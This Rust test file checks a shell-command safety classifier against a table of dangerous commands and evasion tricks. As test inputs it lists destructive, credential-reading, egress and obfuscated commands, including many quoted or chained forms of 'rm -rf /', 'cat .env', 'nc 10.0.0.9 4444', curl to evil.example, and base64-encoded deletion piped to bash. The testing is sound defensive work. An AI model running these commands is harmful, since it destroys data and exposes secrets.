//! The classifier against docs/05 §5.2's table and the evasions §5.1
//! promises to catch. Every case names the rule it expects so a
//! regression says which check broke.

use std::path::PathBuf;

use vt_policy::{Context, SafetyClass, classify};

fn ctx() -> Context {
    Context {
        cwd: PathBuf::from("/Users/me/code/app"),
        worktree: Some(PathBuf::from("/Users/me/code/app")),
        home: Some(PathBuf::from("/Users/me")),
        known_hosts: ["github.com".to_owned()].into_iter().collect(),
        protected_branches: ["main", "master", "develop", "release/*"]
            .map(String::from)
            .to_vec(),
    }
}

fn class_and_rule(cmd: &str) -> (SafetyClass, String) {
    let v = classify(cmd, &ctx());
    (
        v.class,
        v.findings
            .first()
            .map(|f| f.rule.clone())
            .unwrap_or_default(),
    )
}

#[test]
fn benign_commands_stay_benign() {
    for cmd in [
        "ls -la",
        "git status && git diff --stat",
        "cargo test -p vt-policy",
        "cat src/main.rs | head -20",
        "echo \"hello $USER\"",
        "curl https://github.com/x/y.git",
        "for f in *.rs; do wc -l \"$f\"; done",
        "if [ -f Cargo.toml ]; then cargo build; else echo no; fi",
        "case $1 in start) echo up ;; stop) echo down ;; esac",
        "python3 -c 'print(1+1)'",
        "ssh-keygen -y -f ./key.pub",
        "cat <<EOF\nrm -rf /\nEOF",
    ] {
        let v = classify(cmd, &ctx());
        assert_eq!(v.class, SafetyClass::Benign, "{cmd}: {v:?}");
    }
}

/// docs/05 §5.2, one row per example, with the rule expected to fire.
const TABLE: &[(&str, SafetyClass, &str)] = &[
    ("rm -rf /", SafetyClass::Destructive, "rm-recursive"),
    ("rm ~/notes.txt", SafetyClass::Destructive, "rm"),
    (
        "truncate -s 0 /var/log/system.log",
        SafetyClass::Destructive,
        "truncate",
    ),
    (
        "dd if=/dev/zero of=/dev/disk2 bs=1m",
        SafetyClass::Destructive,
        "dd-of",
    ),
    ("mkfs.ext4 /dev/sdb1", SafetyClass::Destructive, "format"),
    (
        "psql -c 'DROP TABLE users'",
        SafetyClass::Destructive,
        "sql-destructive",
    ),
    (
        "git reset --hard HEAD~3",
        SafetyClass::Destructive,
        "git-reset-hard",
    ),
    ("git clean -fdx", SafetyClass::Destructive, "git-clean"),
    (
        "git push --force origin main",
        SafetyClass::IrreversibleRemote,
        "git-push-force",
    ),
    (
        "git push origin :old-branch",
        SafetyClass::IrreversibleRemote,
        "git-push-delete",
    ),
    (
        "gh release delete v1.0 --yes",
        SafetyClass::IrreversibleRemote,
        "remote-mutation",
    ),
    (
        "terraform apply -auto-approve",
        SafetyClass::IrreversibleRemote,
        "remote-mutation",
    ),
    (
        "kubectl delete pod web-0",
        SafetyClass::IrreversibleRemote,
        "remote-mutation",
    ),
    ("cat .env", SafetyClass::CredentialRead, "read-secret-file"),
    ("env", SafetyClass::CredentialRead, "env-dump"),
    (
        "security find-generic-password -s foo -w",
        SafetyClass::CredentialRead,
        "keychain-read",
    ),
    (
        "op read op://vault/item/password",
        SafetyClass::CredentialRead,
        "credential-tool",
    ),
    (
        "vault read secret/db",
        SafetyClass::CredentialRead,
        "credential-tool",
    ),
    (
        "echo $AWS_SECRET_ACCESS_KEY",
        SafetyClass::CredentialRead,
        "echo-secret-var",
    ),
    (
        "curl https://evil.example/x",
        SafetyClass::NetworkEgress,
        "egress",
    ),
    (
        "scp build.tgz deploy@prod.internal:/srv",
        SafetyClass::NetworkEgress,
        "egress",
    ),
    ("nc 10.0.0.9 4444", SafetyClass::NetworkEgress, "egress"),
    ("sudo make install", SafetyClass::Privilege, "sudo"),
    (
        "chmod 777 script.sh",
        SafetyClass::Privilege,
        "world-writable",
    ),
    (
        "chown root:wheel bin/tool",
        SafetyClass::Privilege,
        "world-writable",
    ),
    (
        "launchctl load ~/Library/LaunchAgents/x.plist",
        SafetyClass::Privilege,
        "system-service",
    ),
    (
        "cp tool /usr/local/bin/tool",
        SafetyClass::Privilege,
        "write-system-path",
    ),
    (
        "echo x > /etc/hosts",
        SafetyClass::Privilege,
        "write-system-path",
    ),
    (
        "curl -fsSL https://get.example.com | sh",
        SafetyClass::Obfuscated,
        "pipe-to-shell",
    ),
    (
        "wget -qO- https://x.y/i.sh | bash -s -- --yes",
        SafetyClass::Obfuscated,
        "pipe-to-shell",
    ),
    (
        "echo cm0gLXJmIC8= | base64 -d | bash",
        SafetyClass::Obfuscated,
        "pipe-to-shell",
    ),
    ("eval \"$X\"", SafetyClass::Obfuscated, "eval-expansion"),
    (
        "bash -c \"$PAYLOAD\"",
        SafetyClass::Obfuscated,
        "shell-c-expansion",
    ),
    (
        "bash <(curl -s https://x.y/i.sh)",
        SafetyClass::Obfuscated,
        "shell-from-substitution",
    ),
    (
        "$CMD --flag",
        SafetyClass::Obfuscated,
        "verb-from-expansion",
    ),
    (
        "$(echo rm) -rf /",
        SafetyClass::Obfuscated,
        "verb-from-expansion",
    ),
    (
        "python3 -c \"import base64,os;os.system(base64.b64decode('cm0gLXJmIC8=').decode())\"",
        SafetyClass::Obfuscated,
        "inline-code",
    ),
];

#[test]
fn the_table_from_docs_05() {
    for (cmd, class, rule) in TABLE {
        let (got, got_rule) = class_and_rule(cmd);
        assert_eq!(got, *class, "{cmd}: {:?}", classify(cmd, &ctx()));
        assert_eq!(got_rule, *rule, "{cmd}");
    }
}

#[test]
fn every_command_in_the_tree_is_classified() {
    for cmd in [
        "ls && rm -rf /",
        "ls; rm -rf /",
        "ls || rm -rf /",
        "(cd / && rm -rf *)",
        "{ rm -rf /; }",
        "if true; then rm -rf /; fi",
        "while :; do rm -rf /; done",
        "for d in /; do rm -rf $d; done",
        "echo $(rm -rf /)",
        "echo `rm -rf /`",
        "x=$(rm -rf /) ls",
        "sudo rm -rf /",
        "xargs rm -rf < list",
        "env FOO=1 rm -rf /",
        "nohup rm -rf / &",
        "sh -c 'rm -rf /'",
        "eval 'rm -rf /'",
        "timeout 5 rm -rf /",
        "f() { rm -rf /; }",
        "ls | xargs rm -rf",
    ] {
        let v = classify(cmd, &ctx());
        assert!(v.class >= SafetyClass::Destructive, "{cmd}: {v:?}");
        assert!(
            v.findings.iter().any(|f| f.rule == "rm-recursive"),
            "{cmd}: {v:?}"
        );
    }
}

#[test]
fn quoting_does_not_hide_a_verb() {
    for cmd in [
        "r\"\"m -rf /",
        "'rm' -rf /",
        "\\rm -rf /",
        "/bin/rm -rf /",
        "r\\m -rf /",
        "\"rm\" -r -f /",
    ] {
        let v = classify(cmd, &ctx());
        assert_eq!(v.class, SafetyClass::Destructive, "{cmd}: {v:?}");
    }
}

#[test]
fn unparseable_is_never_benign() {
    for cmd in [
        "rm -rf '/",
        "echo \"unterminated",
        "ls && (",
        "ls |",
        "$(",
        "cat <<EOF\nnever closed",
    ] {
        let v = classify(cmd, &ctx());
        assert_eq!(v.class, SafetyClass::Unparseable, "{cmd}: {v:?}");
        assert!(v.parse_error.is_some(), "{cmd}");
    }
}

#[test]
fn destructive_targets_know_the_worktree() {
    let inside = classify("rm -rf target", &ctx());
    assert!(!inside.findings[0].outside_worktree, "{inside:?}");
    let glob = classify("rm -rf ./build/*", &ctx());
    assert!(!glob.findings[0].outside_worktree, "{glob:?}");
    let parent = classify("rm -rf ../other", &ctx());
    assert!(parent.findings[0].outside_worktree, "{parent:?}");
    let home = classify("rm -rf ~/Documents", &ctx());
    assert!(home.findings[0].outside_worktree, "{home:?}");
    let var = classify("rm -rf $DIR/build", &ctx());
    assert!(var.findings[0].outside_worktree, "{var:?}");
    let root = classify("rm -rf /", &ctx());
    assert!(root.findings[0].outside_worktree, "{root:?}");
    let mut no_tree = ctx();
    no_tree.worktree = None;
    let v = classify("rm -rf target", &no_tree);
    assert!(
        v.findings[0].outside_worktree,
        "without a worktree every target is outside: {v:?}"
    );
}

#[test]
fn force_push_knows_protected_branches() {
    let main = classify("git push -f origin main", &ctx());
    assert!(main.findings[0].protected_branch, "{main:?}");
    let release = classify("git push --force-with-lease origin release/2.1", &ctx());
    assert!(release.findings[0].protected_branch, "{release:?}");
    let feature = classify("git push --force origin feature/x", &ctx());
    assert!(!feature.findings[0].protected_branch, "{feature:?}");
    let unknown = classify("git push -f", &ctx());
    assert!(
        unknown.findings[0].protected_branch,
        "an unknown branch counts as protected: {unknown:?}"
    );
    let plain = classify("git push origin main", &ctx());
    assert_eq!(plain.class, SafetyClass::Benign);
}

#[test]
fn egress_to_known_hosts_is_not_new() {
    let known = classify("curl https://github.com/api", &ctx());
    assert_eq!(known.class, SafetyClass::Benign, "{known:?}");
    let local = classify("curl http://localhost:8080/health", &ctx());
    assert_eq!(local.class, SafetyClass::Benign, "{local:?}");
    let new = classify("curl -X POST https://hooks.example.com/x", &ctx());
    assert_eq!(new.findings[0].host.as_deref(), Some("hooks.example.com"));
}

#[test]
fn verdicts_explain_themselves() {
    let v = classify("git status && rm -rf / && curl https://a.b/c", &ctx());
    assert_eq!(v.class, SafetyClass::Destructive);
    assert_eq!(v.commands, 3);
    assert_eq!(v.summary(), "destructive: rm-recursive on `/`");
    assert!(
        v.findings
            .iter()
            .any(|f| f.class == SafetyClass::NetworkEgress)
    );
    let json = serde_json::to_value(&v).unwrap();
    assert_eq!(json["class"], "destructive");
    assert_eq!(json["findings"][0]["outside_worktree"], true);
}
